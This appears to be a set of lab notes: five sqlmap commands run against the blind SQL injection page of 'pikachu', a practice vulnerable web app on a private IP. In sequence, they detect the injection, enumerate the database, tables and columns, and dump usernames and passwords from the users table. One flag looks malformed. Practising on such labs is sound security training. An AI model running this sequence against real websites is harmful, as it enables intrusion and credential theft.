sqlmap -u "http://192.168.241.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&submit=%E6%9F%A5%E8%AF%A2"
sqlmap -u "http://192.168.241.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&submit=%E6%9F%A5%E8%AF%A2" -currentdb
sqlmap -u "http://192.168.241.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables
sqlmap -u "http://192.168.241.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --columns
sqlmap -u "http://192.168.241.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C username,password --dump